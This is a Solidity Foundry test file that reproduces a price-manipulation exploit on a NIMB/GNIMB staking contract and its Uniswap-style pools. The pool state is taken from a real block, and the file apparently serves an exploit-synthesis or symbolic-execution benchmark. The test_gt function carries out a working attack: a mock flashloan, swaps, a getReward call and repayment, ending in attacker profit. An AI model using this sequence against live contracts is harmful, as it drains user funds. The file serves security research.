// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./GNIMB.sol";
import "./GNIMBStaking.sol";
import "./NBU.sol";
import "./NIMB.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NMBTest is Test, BlockLoader {
    NBU nbu;
    NIMB nimb;
    GNIMB gnimb;
    UniswapV2Pair pairnbunimb;
    UniswapV2Pair pairnbugnimb;
    UniswapV2Factory factory;
    UniswapV2Router router;
    GNIMBStaking gnimbstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address nbuAddr;
    address nimbAddr;
    address gnimbAddr;
    address pairnbunimbAddr;
    address pairnbugnimbAddr;
    address factoryAddr;
    address routerAddr;
    address gnimbstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1670230642;
    uint112 reserve0pairnbugnimb = 9725236852721155802678243;
    uint112 reserve1pairnbugnimb = 1016511225892673227992;
    uint32 blockTimestampLastpairnbugnimb = 1670230307;
    uint256 kLastpairnbugnimb = 0;
    uint256 price0CumulativeLastpairnbugnimb =
        1052794457038217438668234057466281170;
    uint256 price1CumulativeLastpairnbugnimb =
        74014029905778659822139811585719758857071408;
    uint112 reserve0pairnbunimb = 265071137919497555608;
    uint112 reserve1pairnbunimb = 62674388176321590559182896;
    uint32 blockTimestampLastpairnbunimb = 1670230307;
    uint256 kLastpairnbunimb = 0;
    uint256 price0CumulativeLastpairnbunimb =
        419368656836799758243830020230033253638360300;
    uint256 price1CumulativeLastpairnbunimb =
        7839726508306236780654780670054918;
    uint256 totalSupplygnimb = 100000000000000000000000000;
    uint256 balanceOfgnimbpairnbugnimb = 9725236852721155802678243;
    uint256 balanceOfgnimbpairnbunimb = 0;
    uint256 balanceOfgnimbattacker = 0;
    uint256 balanceOfgnimbnbustaking = 7773233890289044800124719;
    uint256 totalSupplynimb = 10000000000000000000000000000;
    uint256 balanceOfnimbpairnbugnimb = 0;
    uint256 balanceOfnimbpairnbunimb = 62674388176321590559182896;
    uint256 balanceOfnimbattacker = 0;
    uint256 balanceOfnimbnbustaking = 0;
    uint256 totalSupplynbu = 2466245080770284349640;
    uint256 balanceOfnbupairnbugnimb = 1016511225892673227992;
    uint256 balanceOfnbupairnbunimb = 265071137919497555608;
    uint256 balanceOfnbuattacker = 0;
    uint256 balanceOfnbunbustaking = 0;

    function setUp() public {
        owner = address(this);
        nbu = new NBU();
        nbuAddr = address(nbu);
        nimb = new NIMB();
        nimbAddr = address(nimb);
        gnimb = new GNIMB();
        gnimbAddr = address(gnimb);
        pairnbunimb = new UniswapV2Pair(
            address(nbu),
            address(nimb),
            reserve0pairnbunimb,
            reserve1pairnbunimb,
            blockTimestampLastpairnbunimb,
            kLastpairnbunimb,
            price0CumulativeLastpairnbunimb,
            price1CumulativeLastpairnbunimb
        );
        pairnbunimbAddr = address(pairnbunimb);
        pairnbugnimb = new UniswapV2Pair(
            address(gnimb),
            address(nbu),
            reserve0pairnbugnimb,
            reserve1pairnbugnimb,
            blockTimestampLastpairnbugnimb,
            kLastpairnbugnimb,
            price0CumulativeLastpairnbugnimb,
            price1CumulativeLastpairnbugnimb
        );
        pairnbugnimbAddr = address(pairnbugnimb);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairnbunimb),
            address(pairnbugnimb),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        gnimbstaking = new GNIMBStaking(
            address(nbu),
            address(nimb),
            address(gnimb),
            address(router),
            50
        );
        gnimbstakingAddr = address(gnimbstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        nbu.transfer(address(pairnbunimb), balanceOfnbupairnbunimb);
        nimb.transfer(address(pairnbunimb), balanceOfnimbpairnbunimb);
        nbu.transfer(address(pairnbugnimb), balanceOfnbupairnbugnimb);
        gnimb.transfer(address(pairnbugnimb), balanceOfgnimbpairnbugnimb);
        nbu.approve(attacker, UINT256_MAX);
        nimb.approve(attacker, UINT256_MAX);
        gnimb.approve(attacker, UINT256_MAX);
        gnimb.transfer(address(gnimbstaking), 1500000 ether);
        gnimb.transfer(attacker, 150000 ether);
        attackContract.setUp(address(gnimb), address(gnimbstaking));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Nbu Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nbu), nbu.decimals());
        queryERC20BalanceDecimals(address(nimb), address(nbu), nimb.decimals());
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nbu),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Nimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(nimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(gnimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(gnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbunimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbunimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbunimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbunimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbugnimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbugnimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbugnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbugnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimbstaking Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(gnimbstaking),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(gnimbstaking),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gnimbstaking),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(attackContract),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(attackContract),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(attackContract),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_nbu(uint256 amount) internal {
        nbu.transferFrom(owner, attacker, amount);
    }

    function payback_nbu(uint256 amount) internal {
        nbu.transfer(owner, amount);
    }

    function borrow_nimb(uint256 amount) internal {
        nimb.transferFrom(owner, attacker, amount);
    }

    function payback_nimb(uint256 amount) internal {
        nimb.transfer(owner, amount);
    }

    function borrow_gnimb(uint256 amount) internal {
        gnimb.transferFrom(owner, attacker, amount);
    }

    function payback_gnimb(uint256 amount) internal {
        gnimb.transfer(owner, amount);
    }

    function swap_pairnbunimb_nbu_nimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(nimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbunimb_nimb_nbu(uint256 amount) internal {
        nimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbugnimb_gnimb_nbu(uint256 amount) internal {
        gnimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(gnimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbugnimb_nbu_gnimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(gnimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pairnbunimb() internal {
        pairnbunimb.sync();
    }

    function sync_pairnbugnimb() internal {
        pairnbugnimb.sync();
    }

    function transaction_gnimbstaking_gnimb(uint256 amount) internal {
        gnimbstaking.getReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(100000000e18);
        printBalance("After step0 ");
        swap_pairnbunimb_nimb_nbu(nimb.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_gnimbstaking_gnimb(0);
        printBalance("After step2 ");
        swap_pairnbunimb_nbu_nimb(nbu.balanceOf(attacker));
        printBalance("After step3 ");
        swap_pairnbugnimb_gnimb_nbu(gnimb.balanceOf(attacker));
        printBalance("After step4 ");
        swap_pairnbunimb_nbu_nimb(3e18);
        printBalance("After step5 ");
        payback_nimb((100000000e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        payback_gnimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
